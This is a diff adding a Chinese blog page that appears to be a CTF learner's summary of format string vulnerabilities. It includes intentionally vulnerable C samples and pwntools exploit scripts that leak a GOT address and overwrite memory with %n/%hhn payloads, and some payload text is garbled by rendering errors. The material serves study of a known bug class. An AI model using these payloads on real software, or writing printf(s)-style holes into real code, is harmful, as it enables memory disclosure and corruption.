@@ -1,0 +1,392 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Cyurl3_BLOG</title>
+<meta name="description" content="我是一个热爱信息安全和记录生活的普通人，一位CTF入门者，编程语言使用者，一位极客追逐者。" />
+<link rel="shortcut icon" href="https://zhangzy999.github.io//favicon.ico?v=1591506124713">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://zhangzy999.github.io//styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://zhangzy999.github.io/">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://zhangzy999.github.io//images/avatar.png?v=1591506124713" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">Cyurl3_BLOG</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li><a href="#%E6%B3%84%E9%9C%B2%E5%86%85%E5%AD%98">泄露内存</a>
+<ul>
+<li><a href="#%E6%B3%84%E9%9C%B2%E6%A0%88%E5%86%85%E5%AD%98">泄露栈内存</a>
+<ul>
+<li><a href="#%E8%8E%B7%E5%8F%96%E6%A0%88%E5%8F%98%E9%87%8F%E7%9A%84%E6%95%B0%E5%80%BC">获取栈变量的数值</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96%E6%A0%88%E5%8F%98%E9%87%8F%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2">获取栈变量的字符串</a></li>
+</ul>
+</li>
+<li><a href="#%E6%B3%84%E9%9C%B2%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%85%E5%AD%98">泄露任意地址内存</a></li>
+</ul>
+</li>
+<li><a href="#%E8%A6%86%E7%9B%96%E5%86%85%E5%AD%98">覆盖内存</a>
+<ul>
+<li><a href="#%E8%A6%86%E7%9B%96%E6%A0%88%E5%86%85%E5%AD%98">覆盖栈内存</a></li>
+<li><a href="#%E8%A6%86%E7%9B%96%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%85%E5%AD%98">覆盖任意地址内存</a>
+<ul>
+<li><a href="#%E8%A6%86%E7%9B%96%E5%B0%8F%E5%80%BC">覆盖小值</a></li>
+<li><a href="#%E8%A6%86%E7%9B%96%E5%A4%A7%E5%80%BC">覆盖大值</a></li>
+</ul>
+</li>
+<li><a href="#pwntools%E4%B8%AD%E7%9A%84%E5%AE%9D%E8%97%8F%E5%87%BD%E6%95%B0">pwntools中的宝藏函数</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="https://zhangzy999.github.io/" class="menu" style="animation-delay: 0s">
+          主页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          所有文章
+        </a>
+      
+    
+      
+        <a href="https://zhangzy999.github.io/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://zhangzy999.github.io/post/dalaoboke" class="menu" style="animation-delay: 0.6000000000000001s">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">HELLO WORLD.</div>
+    <a class="rss" href="https://zhangzy999.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">格式化字符串漏洞学习总结</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2020-06-06 / 7 min read
+        </div>
+        
+          <img class="post-feature-image rounded-lg mx-auto my-4" src="https://zhangzy999.github.io//post-images/format_string_study.jpg" alt="">
+        
+        <div class="post-content yue">
+          <p>从ctfwiki上学习了一波，来总结一下（推荐看ctfwiki，很详细，但是看完适合自己总结，第二遍看的时候就有些冗余了）<br>
+初学格式化字符串建议看wiki，本文是总结篇</p>
+<h1 id="泄露内存">泄露内存</h1>
+<h2 id="泄露栈内存">泄露栈内存</h2>
+<p>关于栈内存的泄露比较简单，不多说了</p>
+<h3 id="获取栈变量的数值">获取栈变量的数值</h3>
+<h3 id="获取栈变量的字符串">获取栈变量的字符串</h3>
+<h2 id="泄露任意地址内存">泄露任意地址内存</h2>
+<p>看实例程序</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+int main() {
+  char s[100];
+  int a = 1, b = 0x22222222, c = -1;
+  scanf(&quot;%s&quot;, s);
+  printf(&quot;%08x.%08x.%08x.%s\n&quot;, a, b, c, s);
+  printf(s);     //这个地方显然有格式化字符串漏洞
+  return 0;
+}
+</code></pre>
+<p>编译一下</p>
+<pre><code>gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c
+</code></pre>
+<p>泄露指定地址的方法：</p>
+<pre><code>addr%k$s
+</code></pre>
+<p>确定字符串为几个参数的方法：</p>
+<pre><code>AAAA%p%p%p%p%p%p%p%p%p%p%p%p
+</code></pre>
+<p>我们设置一个可访问的地址，用scanf@got来举例子拿到scanf的地址（一般不泄露printf函数的地址，自己实操一下即可）<br>
+第一步，拿到scanf@got的地址（可有可无）<br>
+<img src="https://zhangzy999.github.io//post-images/1591436467954.png" alt="" loading="lazy"><br>
+第二步，判断是<strong>格式化字符串</strong>的第几个参数<br>
+通过%p的那种形式可以判断出来是格式化字符串的第四个参数<br>
+<img src="https://zhangzy999.github.io//post-images/1591436474937.png" alt="" loading="lazy"><br>
+第三步，写payload</p>
+<pre><code class="language-python">from pwn import *
+
+filename = './format_string_1_leakmemory'
+sh = process(filename)
+elf = ELF(filename)
+
+scanf_got = elf.got['__libc_start_main']
+payload = p32(scanf_got) + '%4$s'
+
+sh.sendline(payload)
+
+sh.recvuntil('%4$s')
+print hex(u32(sh.recv()[4:8]))
+</code></pre>
+<p>然后就拿到了scanf的地址</p>
+<h1 id="覆盖内存">覆盖内存</h1>
+<h2 id="覆盖栈内存">覆盖栈内存</h2>
+<p>实例程序：</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+int a = 123, b = 456;
+int main() {
+  int c = 789;
+  char s[100];
+  printf(&quot;%p\n&quot;, &amp;c);
+  scanf(&quot;%s&quot;, s);
+  printf(s);
+  if (c == 16) {
+    puts(&quot;modified c.&quot;);
+  } else if (a == 2) {
+    puts(&quot;modified a for a small number.&quot;);
+  } else if (b == 0x12345678) {
+    puts(&quot;modified b for a big number!&quot;);
+  }
+  return 0;
+}
+</code></pre>
+<p>同样存在格式化字符串的漏洞，我们在这一小节来覆盖c的值，让他等于16<br>
+还是两步走：<br>
+第一步：确定c的地址（在程序中的第六行已经打印出来c的地址）<br>
+第二步：确定格式化字符串的参数（不再赘述，还是gdb中下断点或者直接运行程序数0x的个数，aaaa%p大法）<br>
+确定了这两步就能把payload写出来了<br>
+payload：p32([c_addr]) + (16-4) * 'A' + '%k$n'</p>
+<h2 id="覆盖任意地址内存">覆盖任意地址内存</h2>
+<h3 id="覆盖小值">覆盖小值</h3>
+<p>我们覆盖变量a<br>
+还是两步走：<br>
+第一步：确定a的地址，直接ida<br>
+第二部：确定格式化字符串的参数<br>
+注意，由于是小值（我们想要a的值是2），我们就不能把a的地址放到首位了，因为放到首位明显就占四字节，不可能让它再等于2了，所以我们往后移，同样的，格式化字符串参数也得后移<br>
+payload：2 * 'a' + '%K$n' + 2 * 'a'(为了占够4字节) + p32([a_addr])</p>
+<h3 id="覆盖大值">覆盖大值</h3>
+<p>我们覆盖变量b<br>
+还是两步走：<br>
+第一步：确定b的地址，直接ida<br>
+第二步：确定格式化参数<br>
+注意，我们的b是要变成0x12345678，输入那么多东西显然不太好，我们就采用一个字节一个字节的覆盖，就是b的地址覆盖0x78，然后b+1的地址处覆盖0x56，这种意思，有点儿像定位攻击一样<br>
+payload：p32([b_addr]) + p32([b_addr+1]) + ... + p32([b_addr+4]) +  104 * 'a' + '%6<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \* at position 12: hhn&#039; + 222 \̲*̲ &#039;a&#039; + &#039;%7'>hhn&#039; + 222 \* &#039;a&#039; + &#039;%7</span>hhn' + 222 * 'a' + '%8<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \* at position 12: hhn&#039; + 222 \̲*̲ &#039;a&#039; + &#039;%9'>hhn&#039; + 222 \* &#039;a&#039; + &#039;%9</span>hhn'<br>
+（104 + 16(16是前面的四个地址加起来16字节) = 0x78，0x78 + 222 = 0x156，自动舍弃前面的1，即0x56，后面的计算方法同上，不再赘述）</p>
+<h2 id="pwntools中的宝藏函数">pwntools中的宝藏函数</h2>
+<pre><code> pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') → str[source]
+
+    Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from context.bits
+
+    The overflows argument is a format-string-length to output-amount tradeoff: Larger values for overflows produce shorter format strings that generate more output at runtime.
+    Parameters:	
+        offset (int) – the first formatter’s offset you control
+        writes (dict) – dict with addr, value {addr: value, addr2: value2}
+        numbwritten (int) – number of byte already written by the printf function
+        write_size (str) – must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)
+        overflows (int) – how many extra overflows (at size sz) to tolerate to reduce the length of the format string
+        strategy (str) – either ‘fast’ or ‘small’ (‘small’ is default, ‘fast’ can be used if there are many writes)
+    
+    Returns:	The payload in order to do needed writes
+</code></pre>
+<p>所以之前的覆盖abc的payload就不用我们再算来算去了<br>
+直接调用这个超级无敌牛掰的函数<br>
+覆盖c：payload = fmtstr_payload(6,{c_addr:0x10},write_size='int')<br>
+覆盖a：payload = fmtstr_payload(6,{a_addr:2},write_size='short')<br>
+覆盖b：payload = fmtstr_payload(6,{0x0804A028:0x12345678},write_size='byte')<br>
+其实对于第三个参数write_size，万能方法是让它等于'byte'，因为按字节来写入是最准确的，默认值也是byte，所以我们也可省略第三个参数<br>
+另外附上覆盖内存的exp（我用封装函数的形式来写）</p>
+<pre><code class="language-python">from pwn import *
+
+filename = './overflow'
+sh = process(filename)
+def stack():
+	c_addr = sh.recvuntil('\n',drop = True)
+	c_addr = int(c_addr,16)
+	#payload = p32(c_addr) + 12 * 'a' + '%6$n'
+	payload = fmtstr_payload(6,{c_addr:0x10},write_size='int')
+
+	sh.sendline(payload)
+	print sh.recv()
+
+def small():
+	a_addr = 0x0804A024
+	
+
+	#payload = 'aa' + '%8$n' + 'aa' + p32(a_addr)
+	payload = fmtstr_payload(6,{a_addr:2},write_size='short')	
+
+	sh.sendline(payload)
+	print sh.recv()
+
+def big():
+	b_addr = 0x0804A028
+	#payload = p32(b_addr) + p32(b_addr + 1) + p32(b_addr + 2) + p32(b_addr + 3)
+	#payload = payload + 104 * 'a' + '%6$hhn' + 222 * 'a' + '%7$hhn' + 222 * 'a' + '%8$hhn' + 222 * 'a' + '%9$hhn'
+	payload = fmtstr_payload(6,{0x0804A028:0x12345678},write_size='byte')
+	sh.sendline(payload)
+	print sh.recv()
+
+big()
+</code></pre>
+
+        </div>
+
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://zhangzy999.github.io/tag/QegrCyKpB/">
+            <span class="flex-auto">格式化字符串</span>
+          </a>
+        
+
+
+        <div class="flex justify-between py-8">
+          
+
+          
+            <div class="next-post">
+              <a href="https://zhangzy999.github.io/post/gong-fang-shi-jie-pwn-xin-shou-qu-int_overflow/">
+                <h3 class="post-title">
+                  攻防世界pwn新手区—int_overflow
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://zhangzy999.github.io//media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
